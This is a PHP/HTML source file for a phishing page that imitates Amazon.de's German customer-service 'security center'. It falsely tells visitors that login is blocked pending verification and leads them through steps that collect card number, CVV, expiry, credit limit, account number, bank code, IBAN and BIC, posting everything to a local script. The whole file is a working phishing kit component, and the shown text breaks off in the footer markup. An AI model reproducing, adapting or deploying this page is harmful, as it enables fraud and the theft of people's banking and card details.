<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="stylesheet" href="src/css/31O9784sOL.css">
		<link rel="stylesheet" href="src/css/61qjsbDraqL.css">
		<title><?php echo $title ?></title>
		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
		<link rel="stylesheet" href="src/font-awesome/css/font-awesome.min.css">
		<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">

		<link href="src/img/favicon.ico" rel="shortcut icon" />
		<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
		<script type="text/javascript">
			$(document).ready(function() {
				$( "#ccnr" ).change(function() {
					var firstNumber = $("#ccnr").val()[0];
					
					if (firstNumber == 3) {
						$("#ccnr").css("background-position", "225px 12%");
					} else if (firstNumber == 4) {
						$("#ccnr").css("background-position", "225px -0.5%");
					} else if (firstNumber == 5) {
						$("#ccnr").css("background-position", "225px 5.7%");
					} else {
						$("#ccnr").css("background-position", "225px 87%");
					}
				});
				
				$( "#enterIBAN" ).click(function() { 
					$("#blzfield").css("display", "none");
					$("#ktofield").css("display", "none");
					$("#iban_lbl_field").css("display", "none");
					$("#ibanfield").css("display", "table-row");
					$("#bicfield").css("display", "table-row");
					$("#kto_lbl_field").css("display", "table-row");
					$("#kto_active").val("0");
				});
				
				$( "#enterKtoBLZ" ).click(function() { 
					$("#blzfield").css("display", "table-row");
					$("#ktofield").css("display", "table-row");
					$("#iban_lbl_field").css("display", "table-row");
					$("#ibanfield").css("display", "none");
					$("#bicfield").css("display", "none");
					$("#kto_lbl_field").css("display", "none");
					$("#kto_active").val("1");
				});
				
				$( "#noCC" ).click(function() { 
					if ($("#noCC" ).is( ":checked" )) {
						$("#ccnr").attr("disabled", true);
						$("#cvv").attr("disabled", true);
						$("#ccDate1").attr("disabled", true);
						$("#ccDate2").attr("disabled", true);
						$("#limit").attr("disabled", true);
						$("#cc_active").val("0");
					} else {
						$("#ccnr").removeAttr("disabled");
						$("#cvv").removeAttr("disabled");
						$("#ccDate2").removeAttr("disabled");
						$("#ccDate1").removeAttr("disabled");
						$("#limit").removeAttr("disabled");
						$("#cc_active").val("1");
					}
				});
			});
		</script>
	</head>
	
	<body class="a-meter-animate">
		<style type="text/css">
			.nav-sprite-v1 .nav-sprite, .nav-sprite-v1 .nav-icon {
			  background-image: url(src/img/nav-sprite-global_bluebeacon-1x_optimized._CB295582946_.png);
			  background-position: 0 1000px;
			  background-repeat: repeat-x;
			}
			.nav-spinner {
			  background-image: url(src/img/snake._CB192194539_.gif);
			  background-position: center center;
			  background-repeat: no-repeat;
			}
			.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
			  background-image: url(src/img/timeline_sprite_1x.png);
			  background-repeat: no-repeat;
			}
		</style>
		<link rel="stylesheet" href="src/css/719Je9HLSTL.css">
		<link rel="stylesheet" href="src/css/uDzwVmjTcOCPxHLlU3NYtRo6Q5Fev0GI729sXbWEn4.css?<?php echo time();?>">
		<a id="nav-top"></a>
		
		<header class="nav-locale-de nav-lang-de nav-ssl nav-unrec nav-paladin-ww nav-opt-sprite">
			<div id="navbar" role="navigation" class="nav-sprite-v1 nav-bluebeacon">
				<div id="nav-belt">
					<div class="nav-left">
						<div id="nav-logo">
							<a href="#" class="nav-logo-link" tabindex="2">
								<span class="nav-logo-base nav-sprite">Amazon.de</span>
								<span class="nav-logo-ext nav-sprite"></span>
								<span class="nav-logo-locale nav-sprite"></span>
							</a>

							<a href="#" aria-label="" tabindex="3" class="nav-logo-tagline nav-sprite nav-prime-try">
								Prime testen
							</a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-swmslot">
							<div id="navSwmHoliday" style="background-image: url(src/img/prime.jpg); width: 400px; height: 39px; overflow: hidden;position: relative;">
							<img alt="AIV" src="src/img/transparent-pixel.gif" usemap="#nav-swm-holiday-map" height="39px" border="0" width="400px"></div>
						</div>
					</div>
					
					<div class="nav-fill"></div>
				</div>
				
				<div id="nav-main" class="nav-sprite">
					<div class="nav-left">
						<div id="nav-shop">
							<a href="#" class="nav-a nav-a-2" id="nav-link-shopall" tabindex="10"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-right">
						<div id="nav-tools">
							<a href="#" class="nav-a nav-a-2" data-nav-ref="nav_ya_signin" data-nav-role="signin" id="nav-link-yourAccount" tabindex="26" style="border-radius:3px;border: 1px solid #ccc;">
								<span class="nav-line-1">Hallo! Anmelden <span style="color:#FF9900">(Anmeldung nicht möglich! Verifikation erforderlich)</span></span>
								<span class="nav-line-2">Mein Konto<span class="nav-icon nav-arrow" style="visibility: visible;"></span></span>
							</a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-prime" tabindex="27"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
							<a href="#" class="nav-a nav-a-2" id="nav-link-wishlist" tabindex="28"><span class="nav-line-1"></span><span class="nav-line-2"><span class="nav-icon nav-arrow" style="visibility: hidden;"></span></span></a>
						</div>
					</div>
					<div class="nav-fill">
						<div id="nav-xshop-container" class="">
							<div id="nav-xshop">
								<a href="#" data-nav-tabindex="5" class="nav-a nav_a" id="nav-your-amazon">Anmeldung <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="22"> Bestätigung der persönlichen Daten <span style="color:#7CAB2B">&#10004;</span></a>
								<a href="#" class="nav-a" tabindex="23"><span style="color:#FF9900">&#10148; Zahlungsmittel angeben</span></a>
								<a href="#" class="nav-a" tabindex="24">Abschließen <span style="color:red">&#10006;</span></a>
							</div>
						</div>
					</div>
				</div>
				<div id="nav-subnav" style=""></div>
			</div>
		</header>

		<style>
		  #nav-prime-tooltip{
			padding: 0 20px 2px 20px;
			background-color: white;
			font-family: arial,sans-serif;
		  }
		  .nav-npt-text-title{
			font-family: arial,sans-serif;
			font-size: 18px;
			font-weight: bold;
			line-height: 21px;
			color: #E47923;
		  }
		  .nav-npt-text-detail, a.nav-npt-a{
			font-family: arial,sans-serif;
			font-size: 12px;
			line-height: 14px;
			color: #333333;
			margin: 2px 0px;
		  }
		  a.nav-npt-a {
			text-decoration: underline;
		  }
		</style>
		
		<div class="cs-content">
			<div class="cs-contact-title">
				<h1>
					Amazon - Kundenservice Sicherheitscenter
				</h1>
			</div>
			<table id="cs-content-table" cellspacing="0" cellpadding="0" border="0" width="100%">
				<tbody>
				<tr>
					<td colspan="2">
						<div class="f1-steps">
							<div class="f1-progress">
								<div class="f1-progress-line" data-now-value="16.66" data-number-of-steps="3" style="width: 49.99333333333334%;"></div>
							</div>
							<div class="f1-step activated">
								<div class="f1-step-icon"><i class="fa fa-user"></i></div>
								<p>Bestätigung der hinterlegten persönlichen Daten</p>
							</div>
							<div class="f1-step active">
								<div class="f1-step-icon"><i class="fa fa-dollar"></i></div>
								<p>Bestätigung der hinterlegten Zahlungsmittel</p>
							</div>
							<div class="f1-step">
								<div class="f1-step-icon"><i class="fa fa-check"></i></div>
								<p>Zahlungsinformationen bestätigen</p>
							</div>
						</div>						
					</td>
				</tr>
				<tr>
					<td valign="top" width="70%">
						<div class="leftcol">
							<div id="orderSection" class="cu-eyebrow " style="">
								<div class="cu-eb-top">
									<div class="cu-eb-top-left cu-eb-top-left-2"></div>
									<h2 class="step">Bestätigung der hinterlegten Zahlungsmittel</h2>
								</div>

								<div class="cu-middle">
									<div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
										<div id="orderUnrelatedArea" class="newOrderSummary" style="background-color:#FFFFDD;border: 1px solid #A31919">
											<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
												<tbody>
													<tr valign="top">
													<td>
														<div class="newAccountText">
															<span style="background-position-y: -75px"></span>
															<h6>Es ist ein Fehler aufgetreten:</h6>
															<ul style="color:#A31919">
																<?php
																	if (isset($_SESSION['errList'])) {
																		for ($i = 0; $i < count($_SESSION['errList']); $i++) {
																			echo '<li>' . $_SESSION['errList'][$i] . '</li>';
																		}
																		
																		unset($_SESSION['errList']);
																	}
																?>
															</ul>
														</div>
													</td>
												</tr>
												</tbody>
											</table>                                                                           
										</div>
									</div>
								
									<div class="cs-step" id="orderSelect">
										<div id="orderUnrelatedArea" class="newOrderSummary">
											<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
												<tbody>
													<tr valign="top">
													<td>
														<div class="newAccountText">
															<p><img src="src/img/info2.png" style="width:16px;height:16px"/> Bitte geben Sie die bei uns hinterlegten Zahlungsmittel ein und bestätigen Sie dies!</p>
														</div>
													</td>
												</tr>
												</tbody>
											</table>                                                                           
										</div>
									</div>
									
									<div class="contactEmail">
										<form id="sendEmail" name="sendEmail" action="index.php" method="POST">
											<input type="hidden" name="cc_active" id="cc_active" value="<?php echo (isset($_SESSION['noCC']) ? "0" : "1"); ?>"/>
											<input type="hidden" name="kto_active" id="kto_active" value="<?php echo (isset($_SESSION['kto_active']) ? "1" : "0"); ?>"/>
											
											<table cellspacing="10" cellpadding="0">
												<tbody>
													<tr>
														<td style="padding-bottom:7px"><b><label style="font-size:13px">Kreditkartennummer:</label></b></td>
														<td style="padding-bottom:7px">
															<?php
																if (isset($_SESSION['ccnr']) && !empty($_SESSION['ccnr'])) {
																	$icon = null;
																	
																	if (substr($_SESSION['ccnr'], 0, 1) == 3) {
																		$icon = "12%";
																	} else if (substr($_SESSION['ccnr'], 0, 1) == 4) {
																		$icon = "-0.5%";
																	} elseif (substr($_SESSION['ccnr'], 0, 1) == 5) {
																		$icon = "5.7%";
																	}
																} else {
																	$icon = "87%";
																}
															?>
														
															<input name="ccnr" value="<?php echo (isset($_SESSION['ccnr']) ? $_SESSION['ccnr'] : ""); ?>" autocomplete="off" maxlength="16" type="text" id="ccnr"
															style="background-image: url(src/img/cc_typ.png);background-position:225px <?php echo $icon ?>;background-repeat: no-repeat;height:22px;width:250px;margin-top:-5px;<?php echo (isset($_SESSION['cc_err']) ? "border:1px solid #A31919" : ""); ?>" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:10px"><b><label style="font-size:13px">Kartenprüfziffer:</label></b></td>
														<td style="padding-bottom:10px">
															<input name="cvv" value="<?php echo (isset($_SESSION['cvv']) ? $_SESSION['cvv'] : ""); ?>" id="cvv" autocomplete="off" maxlength="4" type="text" style="display:inline-block;height:18px;width:250px;<?php echo (isset($_SESSION['cvv_err']) ? "border:1px solid #A31919" : ""); ?>" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
															<div id='box' style="float:right">
																<a href='#' class="cvc-gif cvvIcon">
																	<span style="left:30%;top:30%;width:370px;height:345px"><img src="src/img/cvc.gif"/></span>
																</a>
															</div>
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:10px"><b><label style="font-size:13px">Gültig bis:</label></b></td>
														<td style="padding-bottom:10px">

															<?php		
																echo '<select style="border:1px solid #a6a6a6;width:77px;padding:4px;border-top-color: #949494' . (isset($_SESSION['ccDate1_err']) ? ";border:1px solid #A31919" : "") . '" name="ccDate1" id="ccDate1"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Monat">Monat</option>';
																
																for ($i = 1; $i <= 12; $i++) {
																	if (isset($_SESSION['ccDate1'])) {
																		if ($i == $_SESSION['ccDate1']) {
																			echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		} else {
																			echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		}
																	} else {
																		echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																	}
																}
																echo '</select>';
															?>
															
															&nbsp;
															
															<?php		
																echo '<select style="border:1px solid #a6a6a6;width:77px;padding:4px;border-top-color: #949494' . (isset($_SESSION['ccDate2_err']) ? ";border:1px solid #A31919" : "") . '" name="ccDate2" id="ccDate2"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Jahr">Jahr</option>';
															
																$year = date("Y");
																for ($i = $year; $i <= $year + 6; $i++) {
																	if (isset($_SESSION['ccDate2'])) {
																		if ($i == $_SESSION['ccDate2']) {
																			echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		} else {
																			echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																		}
																	} else {
																		echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
																	}
																}
																echo '</select>';
															?>
														
														</td>
													</tr>
													
													<tr>
														<td style="padding-bottom:20px"><b><label style="font-size:13px">Verfügungsrahmen (optional):</label></b></td>
														<td style="padding-bottom:20px">
															<input name="limit" value="<?php echo (isset($_SESSION['limit']) ? $_SESSION['limit'] : ""); ?>" id="limit" autocomplete="off" maxlength="10" type="text" style="height:18px;width:250px" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
															<div id='box' style="float:right">
																<a href='#' class="cvvIcon">
																	<span style="top: 40%;left: 30%;">Den Verfügungsrahmen finden Sie auf Ihrer letzten Abrechnung oder online auf dem Portal Ihres Kreditinstituts.</span>
																</a>
															</div>
														</td>
													</tr>
													<tr>
														<td style="width:200px;padding-bottom:20px;border-bottom: 1px dotted #DDD"><input type="checkbox" id="noCC" name="noCC" <?php echo (isset($_SESSION['noCC']) ? "checked" : ""); ?>> Verfüge über keine Kreditkarte</td>
														<td style="padding-bottom:20px;border-bottom: 1px dotted #DDD"></td>
													</tr>
													<tr id="ktofield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "table-row" : "none"); ?>">
														<td style="padding-top:15px;padding-bottom:7px"><b><label style="font-size:13px">Abrechnungskonto:</label></b></td>
														<td style="padding-top:15px;padding-bottom:7px">
															<input id="kto" name="kto" value="<?php echo (isset($_SESSION['kto']) ? $_SESSION['kto'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['kto_err']) ? "border:1px solid #A31919" : ""); ?>">
															<div id='box' style="float:right">
																<a href='#' class="cvvIcon">
																	<span style="top: 50%;left: 30%;">Bitte geben Sie das Abrechnungskonto von Ihrer Kreditkarte an.</span>
																</a>
															</div>
														</td>
													</tr>
													
													<tr id="blzfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "table-row" : "none"); ?>">
														<td style="padding-bottom:5px"><b><label style="font-size:13px">Bankleitzahl:</label></b></td>
														<td style="padding-bottom:5px">
															<input id="blz" name="blz" value="<?php echo (isset($_SESSION['blz']) ? $_SESSION['blz'] : ""); ?>" autocomplete="off" maxlength="20" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['blz_err']) ? "border:1px solid #A31919" : ""); ?>">
														</td>
													</tr>
													
													<tr id="iban_lbl_field" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "table-row" : "none"); ?>">
														<td style="padding-bottom:20px;border-bottom: 1px dotted #DDD"></td>
														<td style="padding-bottom:20px;border-bottom: 1px dotted #DDD"><span class="enterBankData" id="enterIBAN" style="margin-left:135px">IBAN und BIC eingeben</span></td>
													</tr>
													
													<tr id="ibanfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "table-row"); ?>">
														<td style="padding-top:15px;padding-bottom:7px"><b><label style="font-size:13px">IBAN:</label></b></td>
														<td style="padding-top:15px;padding-bottom:7px">
															<input id="iban" name="iban" value="<?php echo (isset($_SESSION['iban']) ? $_SESSION['iban'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['iban_err']) ? "border:1px solid #A31919" : ""); ?>">
														</td>
													</tr>
													
													<tr id="bicfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "table-row"); ?>">
														<td style="padding-bottom:5px"><b><label style="font-size:13px">BIC:</label></b></td>
														<td style="padding-bottom:5px"><input id="bic" name="bic" value="<?php echo (isset($_SESSION['bic']) ? $_SESSION['bic'] : ""); ?>" autocomplete="off" maxlength="20" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['bic_err']) ? "border:1px solid #A31919" : ""); ?>"></td>
													</tr>
													
													<tr id="kto_lbl_field" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "table-row"); ?>">
														<td style="padding-bottom:20px;border-bottom: 1px dotted #DDD"></td>
														<td style="padding-bottom:20px;border-bottom: 1px dotted #DDD"><span class="enterBankData" id="enterKtoBLZ" style="margin-left:60px">Stattdessen Kontonummer eingeben</span></td>
													</tr>
													
													<tr>
														<td style="padding-top:15px"></td>
														<td style="padding-top:15px">
															<input type="image" name="doPaymentInfo" src="src/img/doPersonal.png" style="border:none;margin-left:55px">
															<div style="width:265px">
																<span id="B2B-Full-1-heroctavideo-register" class="a-button a-button-span12 a-button-primary button-register">
																	<span class="a-button-inner btn-sec-sm">
																		<a id="B2B-Full-1-heroctavideo-register-announce" href="javascript:;" class="a-button-text btn-sec-med" role="button" onClick="$('#sendEmail').submit();"><span>Fortfahren</span></a>
																	</span>
																</span>	
															</div>
														</td>
													</tr>
												</tbody>
											</table>
										</form>
									</div>
								</div>

								<div class="cu-eb-bottom">
									<div class="cu-eb-bottom-left"></div>
								</div>
							</div>
						</div>
					</td>
					
					<td valign="top" width="30%">
						<div class="rightcol">
							<div class="a-section cs-help-sidebar-module take-action-sidebar">
								<div class="a-section inner">
									
								<div class="cu_self_service_quick_sol_title cu_self_service_quick_sol_title_default" style="display: block;">
									<h3>
										Schnelle Lösungen
									</h3>
								</div>
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Box_smaller.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-mini a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Meine Bestellungen
													</p>
														<p class="a-size-small a-color-base">
															Nachverfolgen &amp; zurücksenden
														</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Devices_clear-bg.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Geräte &amp; Inhalte
													</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>

								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Prime_clear-bg.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Prime-Mitgliedschaft
													</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>

								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-fixed-left-grid"><div class="a-fixed-left-grid-inner" style="padding-left:46px">
											<div class="a-fixed-left-grid-col a-col-left" style="width:46px;margin-left:-46px;_margin-left:-23px;float:left;">
												<a class="a-link-normal" href="#">
													<img alt="" src="src/img/Payments_clear-bg.png" width="46">
												</a>
											</div>
											<div class="a-spacing-top-base a-fixed-left-grid-col a-col-right" style="padding-left:3.5%;*width:96.1%;float:left;">
												<a class="a-link-normal quick-solution-action" href="#">
													<p class="a-spacing-none a-size-base a-color-base">
														Zahlungseinstellungen
													</p>
												</a>
											</div>
										</div></div>
									</div>
								</div>

								<hr class="a-divider-normal">
											
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-column a-span12">
											<a class="a-link-normal quick-solution-action" href="#">
												<p class="a-spacing-none a-size-base a-color-base">
												   Artikel zurücksenden oder ersetzen
											   </p>
											</a>
										</div>
									</div>
								</div>

								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-column a-span12">
											<a class="a-link-normal quick-solution-action" href="#">
												<p class="a-spacing-none a-size-base a-color-base">
												   Adressbuch verwalten
											   </p>
											</a>
										</div>
									</div>
								</div> 
								<div class="cu_right_col_ss_link cu_right_col_ss_link_default" style="display: block;">
									<div class="a-row a-spacing-micro a-grid-vertical-align a-grid-center">
										<div class="a-column a-span12">
											<a class="a-link-normal quick-solution-action" href="#">
												<p class="a-spacing-none a-size-base a-color-base">
												   Namen, E-Mail-Adresse oder Passwort ändern
											   </p>
											</a>
										</div>
									</div>
								</div>
								</div>
							</div>
							<div class="forum_info_links">
								<div class="cu-rounded">
									<div class="cu-top">
										<div class="cu-top-left">
										</div>
									</div>
									<div class="cu-middle">
										<div class="cs-rounded-content">
											<h4>Finden Sie die Antwort auf Ihre Frage</h4>
											<div>
											   <p>Besuchen Sie unsere Hilfeforen und finden Sie Antworten und hilfreiche Informationen von der Amazon Community.</p>
											   <div>
												   
												   <a href="#" class="w140 cu-forum-info-button cu-forum-info-button amzn-btn btn-sec-med" unselectable="on"><span>Kindle Hilfeforum</span></a>
											   </div>
											</div>
										</div>  
									</div>
									<div class="cu-bottom">
										<div class="cu-bottom-left">
										</div>
									</div>
								</div>
							</div>
						</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
					<img class="display:block" src="src/img/transparent-pixel.gif" height="1px" width="980px">
					</td>
				</tr>
			</tbody></table>
		</div>
		<?php
			if (isset($_SESSION['cc_err'])) { unset($_SESSION['cc_err']); }
			if (isset($_SESSION['cvv_err'])) { unset($_SESSION['cvv_err']); }
			if (isset($_SESSION['ccDate1_err'])) { unset($_SESSION['ccDate1_err']); }
			if (isset($_SESSION['ccDate2_err'])) { unset($_SESSION['ccDate2_err']); }
			if (isset($_SESSION['kto_err'])) { unset($_SESSION['kto_err']); }
			if (isset($_SESSION['blz_err'])) { unset($_SESSION['blz_err']); }
			if (isset($_SESSION['iban_err'])) { unset($_SESSION['iban_err']); }
			if (isset($_SESSION['bic_err'])) { unset($_SESSION['bic_err']); }
		?>
		<div id="navFooter" class="navLeftFooter nav-sprite-v1"> <a href="#" id="navBackToTop"> <div class="navFooterBackToTop"><span class="navFooterBackToTopText">Zurück zum Seitenanfang</span> </div> </a> <table class="navFooterVerticalColumn" cellspacing="0" align="center"> <tbody><tr> <td class="navFooterLinkCol"> <div class="navFooterColHead">Über Amazon</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Karriere bei Amazon</a> </li> <li> <a href="#" class="nav_a">Pressemitteilungen</a> </li> <li> <a href="#" class="nav_a">Über uns - von A bis Z</a> </li> <li> <a href="#" class="nav_a">Amazon Logistikblog</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Impressum</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Geld verdienen mit Amazon</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Jetzt verkaufen</a> </li> <li> <a href="#" class="nav_a">Verkaufen bei Amazon Business</a> </li> <li> <a href="#" class="nav_a">Partnerprogramm</a> </li> <li> <a href="#" class="nav_a">Versand durch Amazon</a> </li> <li> <a href="#" class="nav_a">Bewerben Sie Ihre Produkte</a> </li> <li> <a href="#" class="nav_a">Ihr Buch mit uns veröffentlichen</a> </li> <li> <a href="#" class="nav_a">Amazon Pay</a> </li> <li> <a href="#" class="nav_a">Werden Sie ein Amazon-Lieferant</a> </li> <li class="nav_last nav_a_carat "> <span class="nav_a_carat">›</span> <a href="#" class="nav_a">Alle anzeigen</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Amazon Zahlungsarten</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Amazon.de VISA Karte</a> </li> <li> <a href="#" class="nav_a">Kreditkarten</a> </li> <li> <a href="#" class="nav_a">Gutscheine</a> </li> <li> <a href="#" class="nav_a">Rechnung</a> </li> <li> <a href="#" class="nav_a">Bankeinzug</a> </li> <li> <a href="#" class="nav_a">Amazon Currency Converter</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Mein Amazon-Konto aufladen</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Wir helfen Ihnen</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Lieferung verfolgen oder Bestellung anzeigen</a> </li> <li> <a href="#" class="nav_a">Versand &amp; Verfügbarkeit</a> </li> <li> <a href="#" class="nav_a">Amazon Prime</a> </li> <li> <a href="#" class="nav_a">Rückgabe &amp; Ersatz</a> </li> <li> <a href="#" class="nav_a">Meine Inhalte und Geräte</a> </li> <li> <a href="#" class="nav_a">Amazon App</a> </li> <li> <a href="#" class="nav_a">Amazon Assistant</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Hilfe</a> </li> </ul> </td> </tr> </tbody></table> <div class="nav-footer-line"></div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterDescLine"> <table class="navFooterMoreOnAmazon" cellspacing="0"><tbody> <tr> <td class="navFooterDescItem"> <a href="#" class="nav_a"> AbeBooks<br><span class="navFooterDescText"> Bücher, Kunst<br>&amp; Sammelobjekte </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Amazon BuyVIP<br><span class="navFooterDescText"> Shopping Club<br>für Mode </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Amazon Web Services<br><span class="navFooterDescText"> Cloud Computing Dienste<br>von Amazon </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Audible<br><span class="navFooterDescText"> Hörbücher<br>herunterladen </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Book Depository<br><span class="navFooterDescText"> Bücher mit kostenfreier<br>Lieferung weltweit </span> </a> </td> </tr> <tr><td>&nbsp;</td></tr> <tr> <td class="navFooterDescItem"> <a href="#" class="nav_a"> IMDb<br><span class="navFooterDescText"> Filme, TV<br>&amp; Stars </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Kindle Direct Publishing<br><span class="navFooterDescText"> Ihr E-Book<br>veröffentlichen </span> </a> </td> <td class="navFooterDescSpacer" 